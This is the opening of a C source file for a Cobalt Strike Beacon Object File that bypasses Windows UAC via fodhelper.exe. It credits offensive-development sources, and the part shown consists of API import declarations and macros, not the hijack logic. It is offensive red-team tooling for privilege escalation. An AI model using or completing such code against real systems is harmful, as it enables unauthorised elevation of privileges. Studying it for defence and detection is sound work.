/*
fodhelper-bof modified by @mooolight

Credits:
 * - @cocomelonc  * Malware Development for Ethical Hackers => hack.c - UAC evasion using fodhelper.exe
 * - VX-UG : Vx-API
 */
#include <windows.h>
#include <stdio.h>
#include <shellapi.h>
#include <stdlib.h>

//#pragma comment(lib, "ntdll")
#pragma comment(lib, "Advapi32.lib")
//#pragma comment(lib, "version.lib")
#pragma comment(lib, "shell32.lib")

#ifdef BOF
    #include "..\beacon.h"
    #include "..\bofdefs.h"
    
    // Advapi32
    WINADVAPI LSTATUS WINAPI ADVAPI32$RegCreateKeyExA(HKEY ,LPCSTR ,DWORD ,LPSTR ,DWORD ,REGSAM ,const LPSECURITY_ATTRIBUTES ,PHKEY ,LPDWORD);
    WINADVAPI LSTATUS WINAPI ADVAPI32$RegSetValueExA(HKEY,LPCSTR,DWORD,DWORD,const BYTE *,DWORD);
    WINADVAPI LSTATUS WINAPI ADVAPI32$RegCloseKey(HKEY);
    WINADVAPI LSTATUS WINAPI ADVAPI32$RegDeleteKeyExW(HKEY ,LPCSTR ,REGSAM ,DWORD);
    WINADVAPI LSTATUS WINAPI ADVAPI32$RegDeleteKeyExA(HKEY,LPCSTR,REGSAM,DWORD);

    #define RegCreateKeyExA     ADVAPI32$RegCreateKeyExA
    #define RegSetValueExA      ADVAPI32$RegSetValueExA
    #define RegCloseKey         ADVAPI32$RegCloseKey
    #define RegDeleteKeyExW     ADVAPI32$RegDeleteKeyExW
    #define RegDeleteKeyExA     ADVAPI32$RegDeleteKeyExA

    // Kernel32
    WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);

    #define GetLastError        KERNEL32$GetLastError

    // Shell32
    WINBASEAPI BOOL SHELL32$ShellExecuteExA(SHELLEXECUTEINFOA *);

    #define ShellExecuteExA     SHELL32$ShellExecuteExA

    // Msvcrt
    WINBASEAPI size_t __cdecl MSVCRT$strlen(const char *);
    WINBASEAPI CHAR*  __cdecl MSVCRT$strcat(char *, const char *);

    #define strlen      MSVCRT$strlen
    #define strcat      MSVCRT$strcat

    #define PRINT(...)  BeaconPrintf(CALLBACK_OUTPUT, __VA_ARGS__)

#else

	#define PRINT(...)  printf(__VA_ARGS__);

#endif